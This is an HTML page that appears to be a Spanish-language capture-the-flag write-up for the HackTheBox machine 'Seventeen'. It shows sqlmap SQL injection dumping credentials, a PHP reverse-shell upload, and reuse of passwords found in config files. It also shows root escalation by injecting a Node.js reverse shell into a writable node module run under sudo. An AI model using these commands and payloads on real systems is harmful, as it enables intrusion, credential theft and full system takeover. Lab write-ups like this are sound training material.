@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Seventeen HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/seventeen.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Seventeen HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Seventeen de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Seventeen de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Seventeen HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Seventeen HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Seventeen de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Seventeen HackTheBox</h1>
+          <p>Resolución de la máquina Seventeen de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.165
+Nmap scan report for 10.10.11.165
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt</span>
+</code></pre></div></div>
+
+<div><p>Si hacemos una petición con curl podemos ver el dominio seventeen.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s 10.10.11.165 | </span><span class="s2">grep</span><span class="p"> seventeen | </span><span class="s2">html2text </span><span class="p">|</span><span class="s2"> head</span><span class="p"> -n1
+seventeen.htb</span>
+</code></pre></div></div>
+
+<div><p>Buscando subdominios con gobuster podemos encontrar exam.seventeen.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> vhost -u seventeen.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
+===============================================================
+[+] Threads:      100
+[+] Url:          http://seventeen.htb
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">exam.seventeen.htb</span><span class="p"> (Status: 200) [Size: 17375]</span>
+</code></pre></div></div>
+
+<div><p>En la página podemos encontrar una inyección sql, con sqlmap podemos ver las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -u </span><span class="no">"http://exam.seventeen.htb/?p=take_exam&id=1"</span><span class="p"> --batch -dbs
+&lt......................>
+available databases [4]:
+[*] db_sfms
+[*] erms_db
+[*] information_schema
+[*] roundcubedb</span>
+</code></pre></div></div>
+
+<div><p>Podemos dumpear el contenido de la base de datos db_sfms y encontramos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -u </span><span class="no">"http://exam.seventeen.htb/?p=take_exam&id=1"</span><span class="p"> --batch -D db_sfms --dump
+&lt...............>
+Database: db_sfms
+Table: student
+[4 entries]
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+
+| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+
+| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
+| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
+| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
+| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+</span>
+</code></pre></div></div>
+
+<div><p>Podemos conectarnos al login de <a href="http://seventeen.htb:8000/oldmanagement">oldmanagement</a> con el user id y la contraseña conseguida</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Interesantemente podemos subir archivos, asi que subimos una reverse shell con php</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al hacerlo podemos ver el archivo php que subimos desde el panel de estudiante</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Basta con invocarlo para obtener acceso como www-data en un contenedor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://seventeen.htb:8000/oldmanagement/files/31234/pwned.php</span></code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.165
+</span><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Revisando archivos de configuración podemos ver uno que contiene una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~/html/employeemanagement/system/process</span><span class="p">$ cat dbh.php
+&lt?php
+
+$servername </span><span class="kd">=</span><span class="s2"> "localhost"</span><span class="p">;
+$dBUsername </span><span class="kd">=</span><span class="s2"> "root"</span><span class="p">;
+$dbPassword </span><span class="kd">=</span><span class="s2"> "2020bestyearofmylife"</span><span class="p">;
+$dBName </span><span class="kd">=</span><span class="s2"> "ems"</span><span class="p">;
+
+$conn = mysqliconnect($servername, $dBUsername, $dbPassword, $dBName);
+
+</span><span class="kd">if</span><span class="p">(</span><span class="kd">!</span><span class="p">$conn){
+        </span><span class="k">echo</span><span class="s2"> "Databese Connection Failed"</span><span class="p">;
+}
+
+?>
+</span><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~/html/employeemanagement/system/process</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando el /etc/passwd podemos ver el usuario mark con una bash además de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+mark:x:1000:1000:,,,:/var/www/html:/bin/bash
+</span><span class="s2">www-data@a509a7be8b4b</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos intentar usar estas credenciales para conectarnos por ssh y obtenemos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> mark@10.10.11.165</span><span class="p">
+mark@10.10.11.165's password: </span><span class="kd">2020bestyearofmylife</span><span class="p">
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.165 172.20.0.1 172.17.0.1 172.18.0.1 172.19.0.1 
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+7d5*************************a7b
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>De nuevo revisando archivos de configuración ahora en /opt obtenemor otra contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">/opt/app/node_modules/db-logger</span><span class="p">$ cat logger.js
+</span><span class="k">var</span><span class="p"> mysql </span><span class="kd">=</span><span class="k"> require</span><span class="p">(</span><span class="s2">'mysql'</span><span class="p">);
+
+</span><span class="k">var</span><span class="p"> con </span><span class="kd">=</span><span class="p"> mysql.createConnection({
+  host: </span><span class="s2">"localhost"</span><span class="p">;
+  user: </span><span class="s2">"root"</span><span class="p">;
+  password: </span><span class="s2">"IhateMathematics123#"</span><span class="p">;
+  database: </span><span class="s2">"logger"</span><span class="p">
+
+});
+
+</span><span class="k">function</span><span class="p"> log(</span><span class="no">msg</span><span class="p">) {
+    con.connect(</span><span class="k">function</span><span class="p">(err) {
+        </span><span class="kd">if</span><span class="p"> (err) </span><span class="kd">throw</span><span class="p"> err;
+        </span><span class="k">var</span><span class="p"> date </span><span class="kd">=</span><span class="p"> Date();
+        </span><span class="k">var</span><span class="p"> sql </span><span class="kd">=</span><span class="p"> `INSERT INTO logs (time, msg) VALUES (${date}, ${msg};`;
+        con.query(sql, </span><span class="k">function</span><span class="p"> (err, result) {
+        </span><span class="kd">if</span><span class="p"> (err) </span><span class="kd">throw</span><span class="p"> err;
+        console.log(</span><span class="s2">"[+] Logged"</span><span class="p">);
+        });
+    });
+};
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">/opt/app/node_modules/db-logger</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando los usuarios con una bash esta vez en el equipo real nos encontramos con kavi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+kavi:x:1000:1000:kavi:/home/kavi:/bin/bash
+mark:x:1001:1001:,,,:/home/mark:/bin/bash
+</span><span class="s2">mark@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con las credenciales obtenidas podemos conectarnos por ssh como el usuario kavi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sshpass</span><span class="p"> -p IhateMathematics123# ssh kavi@10.10.11.165 
+</span><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(kavi) gid=1000(kavi) groups=1000(kavi)
+</span><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.165 172.20.0.1 172.17.0.1 172.18.0.1 172.19.0.1 
+</span><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios a nivel de sudoers podemos ver un script en bash en /opt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for kavi: </span><span class="kd">IhateMathematics123#</span><span class="p">
+Matching Defaults entries for kavi on seventeen:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/bin\
+
+User kavi may run the following commands on seventeen:
+    (ALL) /opt/app/startup.sh
+</span><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo vemos que instala del módulo loglevel e inicia una app</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /opt/app/startup.sh
+[=] Checking for db-logger
+[+] db-logger already installed
+[=] Checking for loglevel
+[+] Installing loglevel
+/opt/app
+├── </span><span class="no">loglevel@1.8.0</span><span class="p">
+└── </span><span class="no">mysql@2.18.1</span><span class="p">
+
+[+] Starting the app</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver que crea un directorio loglevel y en las librerias un archivo js</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">/opt/app/node_modules/loglevel/lib</span><span class="p">$ ls
+loglevel.js
+</span><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">/opt/app/node_modules/loglevel/lib</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos permiso de escritura, podemos meter una <a href="https://www.revshells.com">reverse shell</a> en nodejs</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">/opt/app/node_modules/loglevel/lib</span><span class="p">$ cat loglevel.js
+</span><span class="c1">/*
+* loglevel - https://github.com/pimterry/loglevel
+*
+* Copyright (c) 2013 Tim Perry
+* Licensed under the MIT license.
+*/</span><span class="p">
+
+(</span><span class="k">function()</span><span class="p">{
+    </span><span class="k">var</span><span class="p"> net </span><span class="kd">=</span><span class="k"> require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),
+        cp </span><span class="kd">=</span><span class="k"> require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">),
+        sh </span><span class="kd">=</span><span class="p"> cp.spawn(</span><span class="s2">"/bin/bash"</span><span class="p">, []);
+    </span><span class="k">var</span><span class="p"> client </span><span class="kd">= new</span><span class="p"> net.Socket();
+    client.</span><span class="k">connect</span><span class="p">(</span><span class="na">443</span><span class="p">,</span><span class="s2"> "10.10.14.10"</span><span class="p">, </span><span class="k">function</span><span class="p">(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    </span><span class="k">return</span><span class="p"> /a/; </span><span class="c1">// Prevents the Node.js application from crashing</span><span class="p">
+})();</span>
+</code></pre></div></div>
+
+<div><p>Basta con correr de nuevo el script para recibir nuestra reverse shell como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">kavi@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /opt/app/startup.sh
+[=] Checking for db-logger
+[+] db-logger already installed
+[=] Checking for loglevel
+[+] loglevel already installed
+[+] Starting the app</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.165
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="s2">root@seventeen</span><span class="p">:</span><span class="na">/opt/app</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@seventeen</span><span class="p">:</span><span class="na">/opt/app</span><span class="p"># hostname -I
+10.10.11.165 172.20.0.1 172.17.0.1 172.18.0.1 172.19.0.1 
+</span><span class="s2">root@seventeen</span><span class="p">:</span><span class="na">/opt/app</span><span class="p"># cd /root
+</span><span class="s2">root@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+f76**************************bb2
+</span><span class="s2">root@seventeen</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Tener en cuenta que ha habido algunos cambios en la máquina, será actualizado pronto</p></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
